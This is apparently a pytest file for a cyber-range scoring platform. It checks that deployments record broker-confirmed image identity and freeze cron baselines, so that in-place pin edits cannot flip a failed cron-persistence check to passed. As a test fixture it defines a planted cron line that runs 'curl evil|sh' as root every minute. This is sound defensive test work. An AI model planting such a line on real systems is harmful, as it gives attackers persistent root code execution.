"""Plan 18 second review — deploy records what the BROKER confirmed and
freezes the baseline (db layer).

Cron-pin trust binds to what the deployment ACTUALLY RUNS ON, and to a
baseline frozen BEFORE first use — both only the clone authority can
supply honestly. These tests drive the REAL deploy path (routes →
executor → orchestrator → real broker service over the typed boundary)
against the fake backend + a real ApplianceManifest object, read the recorded
identity and frozen baseline back from persisted state, and re-score the
same session through the REAL build_scorecard with synthetic guest
replies. The reviewer's reproduction — an in-place, same-digest pin edit
turning a persisted FAILED into a PASSED — must stay FAILED.
"""
from __future__ import annotations

import hashlib
import json
import pathlib

import pytest
from tests.conftest import launch_and_wait

from infra.images import cron_baseline as cb

pytestmark = pytest.mark.db

ROLE = "mojang-web-local"
TID = 9001                      # the scenario's web01 template
CLEAN = "30 3 * * root e2scrub-all\n"
PLANT = "* * * * * root curl evil|sh\n"


def _sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def _manifest(tmp_path: pathlib.Path, *, bind=True):
    """An installer-shaped manifest whose role image names template 9001
    (the scenario's web template); returns (path, digest)."""
    from infra.dev import install_sequences as seq
    img = tmp_path / "custom-web.qcow2"
    img.write_bytes(b"deployed-artifact-bytes")
    digest = _sha(img.read_bytes())
    path = seq.build_manifest(tmp_path / "materials")
    doc = json.loads(pathlib.Path(path).read_text())
    if bind:
        doc["images"]["mojang-web-local"] = {
            "template_id": TID, "path": str(img), "sha256": digest,
            "size_bytes": img.stat().st_size, "disk_gb": 12,
            "memory_mb": 2048, "vcpus": 2,
        }
        path.write_text(json.dumps(doc))
    return path, digest


def _load(path):
    from infra.appliance.manifest import ApplianceManifest
    return ApplianceManifest.load(path)


def _attach_identity(fake_broker, manifest_obj):
    """The adapter reports identity from ITS loaded manifest object —
    exactly what the appliance broker does (LibvirtBackend delegates to
    the same method); nothing here re-reads the on-disk file."""
    fake_broker.service.backend.artifact_for_template = \
        manifest_obj.artifact_identity


def _pins_file(tmp_path: pathlib.Path, *, digest: str,
               files: dict[str, str]):
    pin = cb.build_pin(ROLE, artifact_sha256=digest,
                       artifact_version="2026.10", template_id=TID,
                       capture={"files": files,
                                "root_crontab_sha256": None})
    doc = tmp_path / "cron-baselines.json"
    cb.dump_pins(doc, {ROLE: pin})
    return doc


def _cron_settings(monkeypatch, path):
    """cron_baseline_file is a REAL, rendered setting (the release pin
    file); overridden on a COPY of the real settings — the launch path
    uses many other fields. There is deliberately no manifest-path knob:
    identity now travels over the broker boundary."""
    import srplatform.verification_service as vs
    from srplatform.settings import get_settings

    def fake():
        return get_settings().model_copy(
            update={"cron_baseline_file": str(path) if path else ""})
    monkeypatch.setattr(vs, "get_settings", fake)


def _resources(session_id):
    from srplatform.db.models import Deployment
    from srplatform.db.session import db
    with db() as s:
        dep = (s.query(Deployment)
               .filter(Deployment.session_id == session_id)
               .order_by(Deployment.deployment_id.desc()).first())
        return list(dep.resources or [])


def _launch(client, users):
    sid = client.post("/sessions", json={"scenario_id": "web-foothold-01"},
                      headers=users["member"]).json()["session_id"]
    launch_and_wait(client, users["member"], sid)
    return sid


# --------------------------------------------------------------------------- #
# the deploy path records broker identity + frozen baseline                     #
# --------------------------------------------------------------------------- #

def test_deploy_records_broker_identity_and_freezes_baseline(
        client, users, fake_broker, tmp_path, monkeypatch):
    import infra.images.cron_baseline as cb
    import srplatform.verification_service as vs
    path, digest = _manifest(tmp_path)
    _attach_identity(fake_broker, _load(path))
    pins = _pins_file(tmp_path, digest=digest,
                      files={"e2scrub_all": _sha(CLEAN.encode())})
    _cron_settings(monkeypatch, pins)

    sid = _launch(client, users)

    web = next(r for r in _resources(sid) if r.get("host") == "web01")
    art = web["cron_artifact"]
    assert art["role"] == ROLE and art["template_vmid"] == TID
    assert art["artifact_sha256"] == digest
    assert art["baseline"] == cb.freeze_baseline(
        cb.load_pins(pins), ROLE, artifact_sha256=digest, template_vmid=TID)
    from srplatform.db.session import db as dbf
    with dbf() as s:
        amap = vs.cron_artifact_map(s, sid)
    assert amap["web01"] == art


def test_recorded_identity_follows_the_broker_not_the_disk(
        client, users, fake_broker, tmp_path, monkeypatch):
    """Config drift (reviewer finding 2): the broker was initialised with
    manifest A; the on-disk manifest is then REPLACED with B. The
    deployment must record A — the identity the clone authority verifies
    its image against — never the newer on-disk bytes it did not deploy."""
    path, digest_a = _manifest(tmp_path)
    manifest_a = _load(path)
    _attach_identity(fake_broker, manifest_a)
    _cron_settings(monkeypatch, None)          # identity-only this test
    # drift the disk AFTER the broker loaded its manifest
    doc = json.loads(path.read_text())
    img_b = tmp_path / "rebuilt-web.qcow2"
    img_b.write_bytes(b"never-deployed-bytes")
    digest_b = _sha(img_b.read_bytes())
    doc["images"]["mojang-web-local"]["sha256"] = digest_b
    doc["images"]["mojang-web-local"]["path"] = str(img_b)
    path.write_text(json.dumps(doc))
    assert _load(path).images[ROLE].sha256 == digest_b   # disk says B now

    sid = _launch(client, users)

    web = next(r for r in _resources(sid) if r.get("host") == "web01")
    assert web["cron_artifact"]["artifact_sha256"] == digest_a
    assert web["cron_artifact"]["artifact_sha256"] != digest_b


def test_deploy_without_broker_identity_records_nothing(
        client, users, fake_broker):
    """Plain fake backend (no artifact manifest):
    honest absence. Nothing is recorded, the map stays empty, cron checks
    stay UNKNOWN — deploy must NOT invent an identity from pins or YAML."""
    import srplatform.verification_service as vs
    sid = _launch(client, users)
    web = next(r for r in _resources(sid) if r.get("host") == "web01")
    assert "cron_artifact" not in web
    from srplatform.db.session import db
    with db() as s:
        assert vs.cron_artifact_map(s, sid) == {}


def test_unnamed_template_records_nothing_never_guesses(
        client, users, fake_broker, tmp_path, monkeypatch):
    """A manifest that does not name the cloned template answers None —
    no identity is recorded, and no pins- or YAML-derived guess takes
    its place."""
    path, digest = _manifest(tmp_path, bind=False)   # 9001 not claimed
    _attach_identity(fake_broker, _load(path))
    pins = _pins_file(tmp_path, digest=digest,
                      files={"e2scrub_all": _sha(CLEAN.encode())})
    _cron_settings(monkeypatch, pins)
    sid = _launch(client, users)
    web = next(r for r in _resources(sid) if r.get("host") == "web01")
    assert "cron_artifact" not in web


def test_deploy_without_pins_freezes_nothing(
        client, users, fake_broker, tmp_path, monkeypatch):
    """Identity without a baseline: the session's cron check stays
    UNKNOWN forever. A pin document appearing LATER is a new deployment's
    business — post-launch baselines are exactly what the review forbade."""
    from infra.images import cron_baseline as cb
    import srplatform.verification_service as vs
    path, digest = _manifest(tmp_path)
    _attach_identity(fake_broker, _load(path))
    _cron_settings(monkeypatch, None)          # pin file absent at deploy
    sid = _launch(client, users)
    web = next(r for r in _resources(sid) if r.get("host") == "web01")
    art = web["cron_artifact"]
    assert "baseline" not in art
    # pins appear after launch: scoring still reads the (missing) freeze
    late = _pins_file(tmp_path, digest=digest,
                      files={"e2scrub_all": _sha(CLEAN.encode())})
    _cron_settings(monkeypatch, late)
    args = vs.with_cron_baseline(
        {"host": "web01", "baseline_files": ["e2scrub_all"]},
        verifier_id="cron_persistence_present", host="web01",
        artifacts={"web01": art}, pins=cb.load_pins(late))
    assert "baseline_file_sha256" not in args


# --------------------------------------------------------------------------- #
# the reviewer reproduction through the REAL persisted scoring path             #
# --------------------------------------------------------------------------- #

class _Guest:
    def __init__(self, files: dict[str, str]):
        self.files = files

    def __call__(self, host: str, command: str):
        if "/etc/cron.d" in command and "crontab" in command:
            out = {"files": {}, "crontab": ""}
            for name, content in self.files.items():
                data = content.encode()
                out["files"][name] = {"uid": 0, "gid": 0, "mode": 0o644,
                                      "size": len(data), "type": "regular",
                                      "sha256": _sha(data),
                                      "symlink_target": None}
            return 0, json.dumps(out)
        return 1, ""          # other checks: unavailable (never invented)


def _cron_item(db_session_id):
    import srplatform.verification_service as vs
    from srplatform.db.session import db
    with db() as s:
        card = vs.build_scorecard(s, db_session_id)
    return next(i for i in card["items"]
                if i["verifier"] == "cron_persistence_present")


def test_same_digest_pin_edit_cannot_rewrite_a_persisted_score(
        client, users, fake_broker, tmp_path, monkeypatch):
    """Second review finding 1 (HIGH) at the real db layer: session
    launched, deployment persisted, file-backed pins loaded, REAL
    build_scorecard with synthetic guest replies. Initial: FAILED, 0
    points. Edit ONLY pins[role]['files'] to the payload's own hash —
    role, template and digest untouched — re-score the SAME bytes:
    still FAILED, 0 points. Revocation (pin removed) degrades to UNKNOWN,
    never to a pass."""
    import srplatform.verification_service as vs
    path, digest = _manifest(tmp_path)
    _attach_identity(fake_broker, _load(path))
    pins = _pins_file(tmp_path, digest=digest,
                      files={"e2scrub_all": _sha(CLEAN.encode())})
    _cron_settings(monkeypatch, pins)
    sid = _launch(client, users)
    web = next(r for r in _resources(sid) if r.get("host") == "web01")
    assert "baseline" in web["cron_artifact"]      # frozen at deploy

    vs.set_verifier_exec(_Guest({"e2scrub_all": PLANT}))
    try:
        item = _cron_item(sid)
        assert item["status"] == "failed" and item["awarded"] == 0
        # the in-place edit: same document, same identity, new "clean"
        doc = json.loads(pins.read_text())
        doc["pins"][ROLE]["files"]["e2scrub_all"] = _sha(PLANT.encode())
        pins.write_text(json.dumps(doc))
        item = _cron_item(sid)
        assert item["status"] == "failed", \
            "same-digest pin edit must not turn persisted bad content clean"
        assert item["awarded"] == 0
        # revocation only degrades: absent pin file => UNKNOWN, 0
        pins.unlink()
        item = _cron_item(sid)
        assert item["status"] == "unknown" and item["awarded"] == 0
        # a CLEAN guest still passes on the frozen truth (the baseline
        # itself never changed)
        _cron_settings(monkeypatch, _pins_file(
            tmp_path, digest=digest, files={"e2scrub_all": _sha(CLEAN.encode())}))
        vs.set_verifier_exec(_Guest({"e2scrub_all": CLEAN}))
        item = _cron_item(sid)
        assert item["status"] == "passed" and item["awarded"] == 10
    finally:
        vs.set_verifier_exec(None)
